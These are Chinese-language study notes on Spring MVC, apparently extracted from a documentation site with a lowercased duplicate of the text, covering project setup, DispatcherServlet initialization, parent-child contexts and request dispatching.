配置 pom.xml\n\n<?xml version="1.0" encoding="UTF-8"?>\n<project xmlns="http://maven.apache.org/POM/4.0.0"\n         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">\n    <modelVersion>4.0.0</modelVersion>\n\n    \x3c!-- spring 包都有 --\x3e\n    <parent>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter-parent</artifactId>\n        <version>2.7.10</version>\n        <relativePath/> \x3c!-- lookup parent from repository --\x3e\n    </parent>\n\n\n    <groupId>com.fengqianrun</groupId>\n    <artifactId>study-springMVC</artifactId>\n    <version>0.0.1-SNAPSHOT</version>\n    \x3c!-- tomcat 认war包 --\x3e\n    <packaging>war</packaging>\n\n    <properties>\n        <maven.compiler.source>8</maven.compiler.source>\n        <maven.compiler.target>8</maven.compiler.target>\n        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>\n    </properties>\n\n    <dependencies>\n        \x3c!-- 只使用mvc --\x3e\n        <dependency>\n            <groupId>org.springframework</groupId>\n            <artifactId>spring-webmvc</artifactId>\n        </dependency>\n    </dependencies>\n\n</project>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n\n 2. 创建 webapp/WEB-INF 目录，并创建 web.xml 文件\n\n<?xml version="1.0" encoding="UTF-8"?>\n\x3c!-- 这个文件是tomcat要去读取的文件，文件路径必须在 webapp/WEB-INF 下，webapp和 java是同级目录 --\x3e\n<web-app>\n    <servlet>\n        <servlet-name>app</servlet-name>\n        <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>\n        <init-param>\n            <param-name>contextConfigLocation</param-name>\n            \x3c!-- 指定spring.xml地址 --\x3e\n            <param-value>/WEB-INF/spring.xml</param-value>\n        </init-param>\n        \x3c!--数字只是决定初始化顺序\n            默认负数：客户端第一次访问才初始化\n            大于零：的数表示服务器启动时，初始化\n            数字越小越先初始化\n        --\x3e\n        <load-on-startup>1</load-on-startup>\n    </servlet>\n\n    <servlet-mapping>\n        <servlet-name>app</servlet-name>\n        \x3c!-- 访问路径前缀 --\x3e\n        <url-pattern>/app/*</url-pattern>\n    </servlet-mapping>\n</web-app>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n 3. 创建 /WEB-INF/spring.xml 文件\n\n<?xml version="1.0" encoding="UTF-8"?>\n<beans xmlns="http://www.springframework.org/schema/beans"\n       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n       xmlns:context="http://www.springframework.org/schema/context"\n       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd">\n\n    <context:component-scan base-package="com.fengqianrun.mvc" />\n\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n 4. 配置 tomcat，Deployment 中配置 war，并修改 Application context\n 5. 访问 url\n\n访问地址为 http://ip:port/tomcat配置的Application context/web.xml里的servlet-name/controller/method\n\n\n1\n\n\n\n# DispatcherServlet 初始化讲解\n\nDispatcherServlet 继承自 HttpServletBean，其最终父类还是 Servlet，只是实现了规范，重写了一些方法。 比如 HttpServletBean 该类重写了 init () 方法，在启动指定 DispatcherServlet 的时候，会调用被重写的 init 方法。整体 init 流程如下：\n\n整个 DispatcherServlet 加载流程：\n1. tomcat会调用servlet的init()方法\n2. HttpServletBean重写了init()方法\n    2.1 读取web.xml里面的内容并封装\n    2.2 执行核心 initServletBean() 方法\n    2.3 initServletBean() 方法调用 initWebApplicationContext()\n3. initWebApplicationContext 方法，用于创建 context 上下文\n    3.1 调用findWebApplicationContext()查询 web.xml 是否自定义了 contextAttribute 这个属性\n    3.2 没用自定义则 createWebApplicationContext(rootContext) 创建 org.springframework.web.context.support.XmlWebApplicationContext 实例，并跟父容器绑定。\n    3.3 给 context 设置环境信息 wac.setEnvironment(getEnvironment());\n    3.4 设置定义 contextConfigLocation(/WEB-INF/spring.xml) 的路径\n    3.5 调用 configureAndRefreshWebApplicationContext() 方法\n4. configureAndRefreshWebApplicationContext 方法，配置context上下文，并初始化bean\n    4.1 设置上下文 ID，为`应用名称`+`servlet-name`\n    4.2 把已有的上下文(cotent)以及配置(config)设置到新的context中\n    4.3 给新的context添加一个ApplicationListener，主要为 ContextRefreshListener，当上下文刷新完毕后通知，该类被通知会调用 **FrameworkServlet.this.onApplicationEvent(event);** 方法，这个方法很重要\n    4.4 调用 refresh() 方法，执行 bean 的初始化操作（spring那一套），执行完调用 this.finishRefresh(); 也就通知到 4.3 中的 ContextRefreshListener对象并调用 FrameworkServlet.this.onApplicationEvent(event);\n5. FrameworkServlet.this.onApplicationEvent(event);调用到DispatcherServlet.initStrategies()方法并会执行以下各种方法： \n    initMultipartResolver(context);\n    initLocaleResolver(context);\n    initThemeResolver(context);\n    initHandlerMappings(context); \n    initHandlerAdapters(context);\n    initHandlerExceptionResolvers(context);\n    initRequestToViewNameTranslator(context);\n    initViewResolvers(context);\n    initFlashMapManager(context);\n6. initHandlerMappings，用于把已经加载到spring容器的对象进行挑拣，把实现了 @RequestMapping | @Controller 的Bean摘出来并得到所有实现了@RequestMapping注解的方法 注册到 mappingRegister 容器中\n    6.1 从容器中读取到实现了HandlerMapping.class 的Bean，这里就是找我们自定义实现了HandlerMapping.class的Bean\n    6.2 如果没有自定义的 HandlerMapping，会加载默认的 HandlerMapping，默认有 BeanNameUrlHandlerMapping,RequestMappingHandlerMapping,RouterFunctionMapping,把找到的注册到 Bean容器中\n        6.2.1 RequestMappingHandlerMapping 在注册Bean的时候会执行 afterPropertiesSet()方法，该方法里面会得到所有Bean，并判断类型是否是有 Controller.class 或 RequestMapping.class 注解，如果符合条件代表你是一个 ControllerHandler\n        6.2.2 如果是一个 ControllerHandler，则获取该类中的方法并得到有只含有RequestMapping.class注解的方法，并且解析注解上的参数,把方法注册到一个 mappingRegistry 里\n    6.3 BeanNameUrlHandlerMapping 是由 ApplicationContextAware 感知调用初始化方法的\n        6.3.1 BeanNameUrlHandlerMapping 和 RequestMappingHandlerMapping 解析的方式不一样，BeanNameUrlHandlerMapping得到容器中所有Bean，会判断BeanName的前缀以 \'/\'开头并收集，并且注册到 handlerMap中\n        6.3.2 BeanNameUrlHandlerMapping 和其他controller写法不一样，具体要给类加 @Component("/test") 并且还有实现 implements Controller\n        6.3.3 找到匹配条件的方法把他维护到自己的 handlerMap 中\n    6.4 注意 BeanNameUrlHandlerMapping 和 RequestMappingHandlerMapping维护了不同的 handler 容器，所以相同的请求路径不会报错，如果相同，执行BeanNameUrlHandlerMapping的方法，因为优先级比RequestMappingHandlerMapping靠前\n7. initHandlerAdapters，初始化方法会先把所需要的准备好加载进去\n    7.1 initHandlerAdapters 从spring容器中找加了 @ControllerAdvice 的Bean\n    7.2 得到Bean后判断加了 @ModelAttribute 的注解但不包含有 @RequestMapping注解的方法 存到 modelAttributeAdviceCache中\n    7.3 得到Bean后判断加了 @InitBinder 的方法 存到 initBinderAdviceCache 中\n    7.4 从容其中得到所有实现 RequestBodyAdvice 或 ResponseBodyAdvice 接口，记录下来\n    7.5 初始化 HttpRequestHandlerAdapter、SimpleControllerHandlerAdapter、RequestMappingHandlerAdapter、HandlerFunctionAdapter\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n\n\n\n# 父子容器\n\n父子容器，就是在一个 web.xml 里面指定两个 servlet，加载不同的 spring.xml，共享一个 listener 父容器的对象。注意：父容器是会在 servlet 节点之前解析的。父子容器具体实现如下：\n\n<?xml version="1.0" encoding="UTF-8"?>\n\x3c!-- 这个文件是tomcat要去读取的文件，文件路径必须在 webapp/WEB-INF 下，webapp和 java是同级目录 --\x3e\n<web-app>\n    \n    \x3c!-- 父容器 --\x3e\n    <listener>\n        <listener-class>org.springframework.web.context.ContextLoaderListener</listener-class>\n    </listener>\n\n    <context-param>\n        <param-name>contextConfigLocation</param-name>\n        \x3c!-- 描述bean的文件 --\x3e\n        <param-value>/WEB-INF/spring2.xml</param-value>\n    </context-param>\n\n    \x3c!-- 子1 --\x3e\n    <servlet>\n        <servlet-name>app</servlet-name>\n        <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>\n        <init-param>\n            <param-name>contextConfigLocation</param-name>\n            \x3c!-- 指定spring.xml地址 --\x3e\n            <param-value>/WEB-INF/spring.xml</param-value>\n        </init-param>\n        \x3c!--数字只是决定初始化顺序\n            默认负数：客户端第一次访问才初始化\n            大于零：的数表示服务器启动时，初始化\n            数字越小越先初始化\n        --\x3e\n        <load-on-startup>1</load-on-startup>\n    </servlet>\n\n    <servlet-mapping>\n        <servlet-name>app</servlet-name>\n        \x3c!-- 访问路径前缀 --\x3e\n        <url-pattern>/app/*</url-pattern>\n    </servlet-mapping>\n\n    \x3c!-- 子2 --\x3e\n    <servlet>\n        <servlet-name>app1</servlet-name>\n        <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>\n        <init-param>\n            <param-name>contextConfigLocation</param-name>\n            \x3c!-- 指定spring.xml地址 --\x3e\n            <param-value>/WEB-INF/spring1.xml</param-value>\n        </init-param>\n        \x3c!--数字只是决定初始化顺序\n            默认负数：客户端第一次访问才初始化\n            大于零：的数表示服务器启动时，初始化\n            数字越小越先初始化\n        --\x3e\n        <load-on-startup>1</load-on-startup>\n    </servlet>\n\n    <servlet-mapping>\n        <servlet-name>app1</servlet-name>\n        \x3c!-- 访问路径前缀 --\x3e\n        <url-pattern>/app1/*</url-pattern>\n    </servlet-mapping>\n\n</web-app>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n\n\nContextLoaderListener 会创建一个容器 ApplicationContext，解析配置的 xml 文件，走 spring 常规的 Bean 加载流程。 这个 ApplicationContext 会被做为 servlet 的父容器被加载到 servletContext（map）中，当 servlet 被加载的时候会和父容器进行绑定，详见 DispatcherServlet 初始化讲解 3.2\n\n\n# 代码取代 xml 配置\n\n整体和 xml 是差不多的\n\npublic class MyWebApplicationInitializer implements WebApplicationInitializer {\n    \n    @Override\n    public void onStartup(ServletContext servletContext) throws ServletException {\n        // Load Spring web application configuration\n        AnnotationConfigWebApplicationContext context = new AnnotationConfigWebApplicationContext();\n        context.register(AppConfig.class);\n\n        // Create and register the DispatcherServlet\n        DispatcherServlet servlet = new DispatcherServlet(context);\n        ServletRegistration.Dynamic registration = servletContext.addServlet("app", servlet);\n        registration.setLoadOnStartup(1);\n        registration.addMapping("/app/*");\n    }\n\n    @ComponentScan("com.fengqianrun.mvc")\n    public class AppConfig{\n\n    }\n    \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\nMyWebApplicationInitializer 被加载是通过 SpringServletContainerInitializer 实现了 ServletContainerInitializer 的规范，在 SpringServletContainerInitializer 中有一个 @HandlesTypes，里面就定义了 WebApplicationInitializer，会把该类加载传入 SpringServletContainerInitializer 的 onStartup 方法，该方法里面继续调用实现了 WebApplicationInitializer 的 onStartup 方法\n\n\n# 请求实现\n\n我们都知道早出写一个 HttpServlet 并实现 service () 转发具体 doGet doPost 并实现业务逻辑。DispatcherServlet 一样实现了 HttpServlet 并重写了 service、doGet、doPost 等方法，实现具体流程是：\n\n1. 由DispatcherServlet的父类FrameworkServlet具体实现了service、doGet、doPost方法\n2. FrameworkServlet会先被调用service()方法，解析方法的请求方式是 get 还是 post，后调用HttpServlet的service()方法进一步判断是调用 doGet 还是 doPost方法\n3. HttpServlet在调用FrameworkServlet具体实现了doGet或doPost方法\n    3.1 \n4. doPost实现会调用FrameworkServlet的子类DispatcherServlet的doService方法\n    4.1 doService 首先会打印请求的信息\n    4.2 把context添加到 request 的请求中\n    4.3 flashMapManager\n    4.4 调用 doDispatch 方法\n5. doDispatch\n    5.1 得到默认的三个 mapping（ BeanNameUrlHandlerMapping,RequestMappingHandlerMapping,RouterFunctionMapping，详细在DispatcherServlet 初始化讲解6.2中）\n    5.2 便利每个 mapping，并得到请求的路径，根据路径去找 handler（这个handler就是DispatcherServlet 初始化讲解6.2.2的方法），如果是BeanNameUrlHandlerMapping找到的是Bean，RequestMappingHandlerMapping找到的是 HanlerMethod 统一为 handler\n    5.3 找到handler后会封装为一个 handler执行链，这个执行链包含了拦截器，所以称为链\n    5.4 由于获取的 handler 是一个object，无法确定是BeanNameUrlHandlerMapping的Bean还是RequestMappingHandlerMapping的HandlerMethod，所以执行 getHandlerAdapter 进行适配\n        5.4.1 把已经加载的 handlerAdapters 进行便利（DispatcherServlet 初始化讲解 7.5）\n        5.4.2 每个 handlerAdapter 实现方式不一样，会有个统一的 supports 方法来判断是否实现了不同 mapping 的要求，并找到合适的 adapter\n            5.4.2.1 如 RequestMappingHandlerMapping 对应的是 RequestMappingHandlerAdapter，adapter 的 supports会判断是否是 HandlerMethod 的实例，是则得到这个 adapter\n        5.4.3 handler执行链开始执行拦截器，会遍历所有的拦截器执行执行前置方法，如果拦截器前置方法返回false则后面不在执行\n        5.4.4 拦截器执行完毕后就可以执行得到的 HandlerAdapter 的 handler 方法，去真正执行 controller 的方法，返回值会封装成 ModelAndView\n            5.4.4.1 检查是否限制了请求方式，比如只支持 POST 请求\n            5.4.4.2 判断是否开启session锁，用于对持有相同session的请求进行并发限制\n            5.4.4.3 执行invokeHandlerMethod方法\n                5.4.4.3.1 找出@InitBinder创建一个 binderFactory 工厂，该工厂是对Method请求参数做类型转换，找的是当前Method或全局的@InitBinder的转换器\n                5.4.4.3.2 生成ModelFactory，把@ModelAttribute的key和value，以及@SessionAttributes的key和value添加到 Model中，可以保障在controller的Model中得到数据\n                5.4.4.3.3 创建一个处理方法的对象，设置方法解析器（解析@RequestParam等注解或对象），返回值解析器（比如加了@ResponseBody要解析成JSON），设置binderFactory\n                5.4.4.3.4 创建 ModelAndViewContainer，给ModelAndViewContainer 添加解析的内容（初始化），然后具体去执行 invokAndHandler(req,ModelAndViewContainer)，得到更多的信息给 ModelAndViewContainer，比如返回结果\n                5.4.4.3.5 最后对 ModelAndViewContainer 进行处理，判断当前请求是否进行了重定向\n        5.4.5 通过返回的 ModelAndView 查找并设置视图\n        5.4.6 执行拦截器后置方法\n        5.4.7 视图渲染\n        5.4.8 再调用拦截的执行完成方法\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n',normalizedContent:'# 搭建\n\n 1. 配置 pom.xml\n\n<?xml version="1.0" encoding="utf-8"?>\n<project xmlns="http://maven.apache.org/pom/4.0.0"\n         xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n         xsi:schemalocation="http://maven.apache.org/pom/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">\n    <modelversion>4.0.0</modelversion>\n\n    \x3c!-- spring 包都有 --\x3e\n    <parent>\n        <groupid>org.springframework.boot</groupid>\n        <artifactid>spring-boot-starter-parent</artifactid>\n        <version>2.7.10</version>\n        <relativepath/> \x3c!-- lookup parent from repository --\x3e\n    </parent>\n\n\n    <groupid>com.fengqianrun</groupid>\n    <artifactid>study-springmvc</artifactid>\n    <version>0.0.1-snapshot</version>\n    \x3c!-- tomcat 认war包 --\x3e\n    <packaging>war</packaging>\n\n    <properties>\n        <maven.compiler.source>8</maven.compiler.source>\n        <maven.compiler.target>8</maven.compiler.target>\n        <project.build.sourceencoding>utf-8</project.build.sourceencoding>\n    </properties>\n\n    <dependencies>\n        \x3c!-- 只使用mvc --\x3e\n        <dependency>\n            <groupid>org.springframework</groupid>\n            <artifactid>spring-webmvc</artifactid>\n        </dependency>\n    </dependencies>\n\n</project>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n\n 2. 创建 webapp/web-inf 目录，并创建 web.xml 文件\n\n<?xml version="1.0" encoding="utf-8"?>\n\x3c!-- 这个文件是tomcat要去读取的文件，文件路径必须在 webapp/web-inf 下，webapp和 java是同级目录 --\x3e\n<web-app>\n    <servlet>\n        <servlet-name>app</servlet-name>\n        <servlet-class>org.springframework.web.servlet.dispatcherservlet</servlet-class>\n        <init-param>\n            <param-name>contextconfiglocation</param-name>\n            \x3c!-- 指定spring.xml地址 --\x3e\n            <param-value>/web-inf/spring.xml</param-value>\n        </init-param>\n        \x3c!--数字只是决定初始化顺序\n            默认负数：客户端第一次访问才初始化\n            大于零：的数表示服务器启动时，初始化\n            数字越小越先初始化\n        --\x3e\n        <load-on-startup>1</load-on-startup>\n    </servlet>\n\n    <servlet-mapping>\n        <servlet-name>app</servlet-name>\n        \x3c!-- 访问路径前缀 --\x3e\n        <url-pattern>/app/*</url-pattern>\n    </servlet-mapping>\n</web-app>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n 3. 创建 /web-inf/spring.xml 文件\n\n<?xml version="1.0" encoding="utf-8"?>\n<beans xmlns="http://www.springframework.org/schema/beans"\n       xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n       xmlns:context="http://www.springframework.org/schema/context"\n       xsi:schemalocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd">\n\n    <context:component-scan base-package="com.fengqianrun.mvc" />\n\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n 4. 配置 tomcat，deployment 中配置 war，并修改 application context\n 5. 访问 url\n\n访问地址为 http://ip:port/tomcat配置的application context/web.xml里的servlet-name/controller/method\n\n\n1\n\n\n\n# dispatcherservlet 初始化讲解\n\ndispatcherservlet 继承自 httpservletbean，其最终父类还是 servlet，只是实现了规范，重写了一些方法。 比如 httpservletbean 该类重写了 init () 方法，在启动指定 dispatcherservlet 的时候，会调用被重写的 init 方法。整体 init 流程如下：\n\n整个 dispatcherservlet 加载流程：\n1. tomcat会调用servlet的init()方法\n2. httpservletbean重写了init()方法\n    2.1 读取web.xml里面的内容并封装\n    2.2 执行核心 initservletbean() 方法\n    2.3 initservletbean() 方法调用 initwebapplicationcontext()\n3. initwebapplicationcontext 方法，用于创建 context 上下文\n    3.1 调用findwebapplicationcontext()查询 web.xml 是否自定义了 contextattribute 这个属性\n    3.2 没用自定义则 createwebapplicationcontext(rootcontext) 创建 org.springframework.web.context.support.xmlwebapplicationcontext 实例，并跟父容器绑定。\n    3.3 给 context 设置环境信息 wac.setenvironment(getenvironment());\n    3.4 设置定义 contextconfiglocation(/web-inf/spring.xml) 的路径\n    3.5 调用 configureandrefreshwebapplicationcontext() 方法\n4. configureandrefreshwebapplicationcontext 方法，配置context上下文，并初始化bean\n    4.1 设置上下文 id，为`应用名称`+`servlet-name`\n    4.2 把已有的上下文(cotent)以及配置(config)设置到新的context中\n    4.3 给新的context添加一个applicationlistener，主要为 contextrefreshlistener，当上下文刷新完毕后通知，该类被通知会调用 **frameworkservlet.this.onapplicationevent(event);** 方法，这个方法很重要\n    4.4 调用 refresh() 方法，执行 bean 的初始化操作（spring那一套），执行完调用 this.finishrefresh(); 也就通知到 4.3 中的 contextrefreshlistener对象并调用 frameworkservlet.this.onapplicationevent(event);\n5. frameworkservlet.this.onapplicationevent(event);调用到dispatcherservlet.initstrategies()方法并会执行以下各种方法： \n    initmultipartresolver(context);\n    initlocaleresolver(context);\n    initthemeresolver(context);\n    inithandlermappings(context); \n    inithandleradapters(context);\n    inithandlerexceptionresolvers(context);\n    initrequesttoviewnametranslator(context);\n    initviewresolvers(context);\n    initflashmapmanager(context);\n6. inithandlermappings，用于把已经加载到spring容器的对象进行挑拣，把实现了 @requestmapping | @controller 的bean摘出来并得到所有实现了@requestmapping注解的方法 注册到 mappingregister 容器中\n    6.1 从容器中读取到实现了handlermapping.class 的bean，这里就是找我们自定义实现了handlermapping.class的bean\n    6.2 如果没有自定义的 handlermapping，会加载默认的 handlermapping，默认有 beannameurlhandlermapping,requestmappinghandlermapping,routerfunctionmapping,把找到的注册到 bean容器中\n        6.2.1 requestmappinghandlermapping 在注册bean的时候会执行 afterpropertiesset()方法，该方法里面会得到所有bean，并判断类型是否是有 controller.class 或 requestmapping.class 注解，如果符合条件代表你是一个 controllerhandler\n        6.2.2 如果是一个 controllerhandler，则获取该类中的方法并得到有只含有requestmapping.class注解的方法，并且解析注解上的参数,把方法注册到一个 mappingregistry 里\n    6.3 beannameurlhandlermapping 是由 applicationcontextaware 感知调用初始化方法的\n        6.3.1 beannameurlhandlermapping 和 requestmappinghandlermapping 解析的方式不一样，beannameurlhandlermapping得到容器中所有bean，会判断beanname的前缀以 \'/\'开头并收集，并且注册到 handlermap中\n        6.3.2 beannameurlhandlermapping 和其他controller写法不一样，具体要给类加 @component("/test") 并且还有实现 implements controller\n        6.3.3 找到匹配条件的方法把他维护到自己的 handlermap 中\n    6.4 注意 beannameurlhandlermapping 和 requestmappinghandlermapping维护了不同的 handler 容器，所以相同的请求路径不会报错，如果相同，执行beannameurlhandlermapping的方法，因为优先级比requestmappinghandlermapping靠前\n7. inithandleradapters，初始化方法会先把所需要的准备好加载进去\n    7.1 inithandleradapters 从spring容器中找加了 @controlleradvice 的bean\n    7.2 得到bean后判断加了 @modelattribute 的注解但不包含有 @requestmapping注解的方法 存到 modelattributeadvicecache中\n    7.3 得到bean后判断加了 @initbinder 的方法 存到 initbinderadvicecache 中\n    7.4 从容其中得到所有实现 requestbodyadvice 或 responsebodyadvice 接口，记录下来\n    7.5 初始化 httprequesthandleradapter、simplecontrollerhandleradapter、requestmappinghandleradapter、handlerfunctionadapter\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n\n\n\n# 父子容器\n\n父子容器，就是在一个 web.xml 里面指定两个 servlet，加载不同的 spring.xml，共享一个 listener 父容器的对象。注意：父容器是会在 servlet 节点之前解析的。父子容器具体实现如下：\n\n<?xml version="1.0" encoding="utf-8"?>\n\x3c!-- 这个文件是tomcat要去读取的文件，文件路径必须在 webapp/web-inf 下，webapp和 java是同级目录 --\x3e\n<web-app>\n    \n    \x3c!-- 父容器 --\x3e\n    <listener>\n        <listener-class>org.springframework.web.context.contextloaderlistener</listener-class>\n    </listener>\n\n    <context-param>\n        <param-name>contextconfiglocation</param-name>\n        \x3c!-- 描述bean的文件 --\x3e\n        <param-value>/web-inf/spring2.xml</param-value>\n    </context-param>\n\n    \x3c!-- 子1 --\x3e\n    <servlet>\n        <servlet-name>app</servlet-name>\n        <servlet-class>org.springframework.web.servlet.dispatcherservlet</servlet-class>\n        <init-param>\n            <param-name>contextconfiglocation</param-name>\n            \x3c!-- 指定spring.xml地址 --\x3e\n            <param-value>/web-inf/spring.xml</param-value>\n        </init-param>\n        \x3c!--数字只是决定初始化顺序\n            默认负数：客户端第一次访问才初始化\n            大于零：的数表示服务器启动时，初始化\n            数字越小越先初始化\n        --\x3e\n        <load-on-startup>1</load-on-startup>\n    </servlet>\n\n    <servlet-mapping>\n        <servlet-name>app</servlet-name>\n        \x3c!-- 访问路径前缀 --\x3e\n        <url-pattern>/app/*</url-pattern>\n    </servlet-mapping>\n\n    \x3c!-- 子2 --\x3e\n    <servlet>\n        <servlet-name>app1</servlet-name>\n        <servlet-class>org.springframework.web.servlet.dispatcherservlet</servlet-class>\n        <init-param>\n            <param-name>contextconfiglocation</param-name>\n            \x3c!-- 指定spring.xml地址 --\x3e\n            <param-value>/web-inf/spring1.xml</param-value>\n        </init-param>\n        \x3c!--数字只是决定初始化顺序\n            默认负数：客户端第一次访问才初始化\n            大于零：的数表示服务器启动时，初始化\n            数字越小越先初始化\n        --\x3e\n        <load-on-startup>1</load-on-startup>\n    </servlet>\n\n    <servlet-mapping>\n        <servlet-name>app1</servlet-name>\n        \x3c!-- 访问路径前缀 --\x3e\n        <url-pattern>/app1/*</url-pattern>\n    </servlet-mapping>\n\n</web-app>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n\n\ncontextloaderlistener 会创建一个容器 applicationcontext，解析配置的 xml 文件，走 spring 常规的 bean 加载流程。 这个 applicationcontext 会被做为 servlet 的父容器被加载到 servletcontext（map）中，当 servlet 被加载的时候会和父容器进行绑定，详见 dispatcherservlet 初始化讲解 3.2\n\n\n# 代码取代 xml 配置\n\n整体和 xml 是差不多的\n\npublic class mywebapplicationinitializer implements webapplicationinitializer {\n    \n    @override\n    public void onstartup(servletcontext servletcontext) throws servletexception {\n        // load spring web application configuration\n        annotationconfigwebapplicationcontext context = new annotationconfigwebapplicationcontext();\n        context.register(appconfig.class);\n\n        // create and register the dispatcherservlet\n        dispatcherservlet servlet = new dispatcherservlet(context);\n        servletregistration.dynamic registration = servletcontext.addservlet("app", servlet);\n        registration.setloadonstartup(1);\n        registration.addmapping("/app/*");\n    }\n\n    @componentscan("com.fengqianrun.mvc")\n    public class appconfig{\n\n    }\n    \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\nmywebapplicationinitializer 被加载是通过 springservletcontainerinitializer 实现了 servletcontainerinitializer 的规范，在 springservletcontainerinitializer 中有一个 @handlestypes，里面就定义了 webapplicationinitializer，会把该类加载传入 springservletcontainerinitializer 的 onstartup 方法，该方法里面继续调用实现了 webapplicationinitializer 的 onstartup 方法\n\n\n# 请求实现\n\n我们都知道早出写一个 httpservlet 并实现 service () 转发具体 doget dopost 并实现业务逻辑。dispatcherservlet 一样实现了 httpservlet 并重写了 service、doget、dopost 等方法，实现具体流程是：\n\n1. 由dispatcherservlet的父类frameworkservlet具体实现了service、doget、dopost方法\n2. frameworkservlet会先被调用service()方法，解析方法的请求方式是 get 还是 post，后调用httpservlet的service()方法进一步判断是调用 doget 还是 dopost方法\n3. httpservlet在调用frameworkservlet具体实现了doget或dopost方法\n    3.1 \n4. dopost实现会调用frameworkservlet的子类dispatcherservlet的doservice方法\n    4.1 doservice 首先会打印请求的信息\n    4.2 把context添加到 request 的请求中\n    4.3 flashmapmanager\n    4.4 调用 dodispatch 方法\n5. dodispatch\n    5.1 得到默认的三个 mapping（ beannameurlhandlermapping,requestmappinghandlermapping,routerfunctionmapping，详细在dispatcherservlet 初始化讲解6.2中）\n    5.2 便利每个 mapping，并得到请求的路径，根据路径去找 handler（这个handler就是dispatcherservlet 初始化讲解6.2.2的方法），如果是beannameurlhandlermapping找到的是bean，requestmappinghandlermapping找到的是 hanlermethod 统一为 handler\n    5.3 找到handler后会封装为一个 handler执行链，这个执行链包含了拦截器，所以称为链\n    5.4 由于获取的 handler 是一个object，无法确定是beannameurlhandlermapping的bean还是requestmappinghandlermapping的handlermethod，所以执行 gethandleradapter 进行适配\n        5.4.1 把已经加载的 handleradapters 进行便利（dispatcherservlet 初始化讲解 7.5）\n        5.4.2 每个 handleradapter 实现方式不一样，会有个统一的 supports 方法来判断是否实现了不同 mapping 的要求，并找到合适的 adapter\n            5.4.2.1 如 requestmappinghandlermapping 对应的是 requestmappinghandleradapter，adapter 的 supports会判断是否是 handlermethod 的实例，是则得到这个 adapter\n        5.4.3 handler执行链开始执行拦截器，会遍历所有的拦截器执行执行前置方法，如果拦截器前置方法返回false则后面不在执行\n        5.4.4 拦截器执行完毕后就可以执行得到的 handleradapter 的 handler 方法，去真正执行 controller 的方法，返回值会封装成 modelandview\n            5.4.4.1 检查是否限制了请求方式，比如只支持 post 请求\n            5.4.4.2 判断是否开启session锁，用于对持有相同session的请求进行并发限制\n            5.4.4.3 执行invokehandlermethod方法\n                5.4.4.3.1 找出@initbinder创建一个 binderfactory 工厂，该工厂是对method请求参数做类型转换，找的是当前method或全局的@initbinder的转换器\n                5.4.4.3.2 生成modelfactory，把@modelattribute的key和value，以及@sessionattributes的key和value添加到 model中，可以保障在controller的model中得到数据\n                5.4.4.3.3 创建一个处理方法的对象，设置方法解析器（解析@requestparam等注解或对象），返回值解析器（比如加了@responsebody要解析成json），设置binderfactory\n                5.4.4.3.4 创建 modelandviewcontainer，给modelandviewcontainer 添加解析的内容（初始化），然后具体去执行 invokandhandler(req,modelandviewcontainer)，得到更多的信息给 modelandviewcontainer，比如返回结果\n                5.4.4.3.5 最后对 modelandviewcontainer 